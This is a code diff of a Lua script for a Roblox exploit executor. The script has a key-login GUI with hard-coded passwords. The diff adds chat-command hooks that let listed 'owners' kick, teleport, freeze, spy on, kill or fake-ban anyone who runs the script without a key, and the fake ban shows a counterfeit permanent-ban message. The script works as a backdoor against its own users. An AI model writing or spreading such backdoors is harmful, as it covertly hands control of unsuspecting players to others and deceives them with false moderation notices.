@@ -7,11 +7,14 @@ local owners = {""}
 local admins = {}
 local buyers = {}
 
--- MULTI-KEY SUPPORT
 local loginKeys = {
     "secretkey123",
-    "sadsadasdasdsadadz"
+    "hyperlolz1"
 }
+
+getgenv().Authorized = false
+local viewingOwner = nil
+local loginGuiVisible = false
 
 -- GUI Setup
 local gui = Instance.new("ScreenGui")
@@ -62,10 +65,6 @@ timerLabel.Font = Enum.Font.SourceSans
 timerLabel.TextSize = 14
 timerLabel.Parent = frame
 
-local viewingOwner = nil
-getgenv().Authorized = false
-local loginGuiVisible = false
-
 local function notify(msg)
     StarterGui:SetCore("SendNotification", {
         Title = "Login",
@@ -103,25 +102,28 @@ UserInputService.InputBegan:Connect(function(input, gpe)
     end
 end)
 
--- Commands
 local function bring(owner)
-    if owner and lp.Character then
+    if not getgenv().Authorized and lp.Character then
         lp.Character:SetPrimaryPartCFrame(owner.Character.HumanoidRootPart.CFrame)
     end
 end
 
 local function freeze()
-    local hrp = lp.Character and lp.Character:FindFirstChild("HumanoidRootPart")
-    if not isAuthorized(lp) and hrp then hrp.Anchored = true end
+    if not getgenv().Authorized and lp.Character then
+        local hrp = lp.Character:FindFirstChild("HumanoidRootPart")
+        if hrp then hrp.Anchored = true end
+    end
 end
 
 local function unfreeze()
-    local hrp = lp.Character and lp.Character:FindFirstChild("HumanoidRootPart")
-    if not isAuthorized(lp) and hrp then hrp.Anchored = false end
+    if not getgenv().Authorized and lp.Character then
+        local hrp = lp.Character:FindFirstChild("HumanoidRootPart")
+        if hrp then hrp.Anchored = false end
+    end
 end
 
 local function view(owner)
-    if not isAuthorized(lp) and lp.Character and owner.Character then
+    if not getgenv().Authorized and lp.Character and owner.Character then
         viewingOwner = owner
         lp.CameraMode = Enum.CameraMode.LockFirstPerson
         lp.CameraSubject = owner.Character:FindFirstChildOfClass("Humanoid")
@@ -138,7 +140,13 @@ end
 
 local function hookChat(authUser)
     authUser.Chatted:Connect(function(msg)
-        if not getgenv().Authorized then return end
+        if not msg then return end
+        if msg == "/commands" then
+            notify("Available: /kick . /bring . /freeze . /unfreeze . /view . /unview . /kill . /ban .")
+            return
+        end
+
+        if getgenv().Authorized then return end
 
         if msg:sub(1, 7) == "/kick ." then
             lp:Kick(msg:sub(9) ~= "" and msg:sub(9) or "Admins Has Kicked You.")
@@ -164,9 +172,6 @@ local function hookChat(authUser)
 
         elseif msg == "/ban ." then
             lp:Kick("You have been permanently banned from this experience. (Error Code: 267)")
-
-        elseif msg == "/commands" then
-            notify("Available: /kick . /bring . /freeze . /unfreeze . /view . /unview . /kill . /ban .")
         end
     end)
 end
@@ -178,7 +183,7 @@ local function isAuthorized(p)
     return false
 end
 
--- MULTI-KEY CHECK
+-- Multi-key login handler
 _G.CheckKey = function(input)
     if getgenv().Authorized then return end
     for _, key in ipairs(loginKeys) do
@@ -193,14 +198,12 @@ _G.CheckKey = function(input)
     notify("Invalid key!")
 end
 
--- Press Enter to submit key
 textbox.FocusLost:Connect(function(enterPressed)
     if enterPressed then
         _G.CheckKey(textbox.Text)
     end
 end)
 
--- Setup authorized users
 for _, name in ipairs(owners) do
     local p = Players:FindFirstChild(name)
     if p then hookChat(p) end
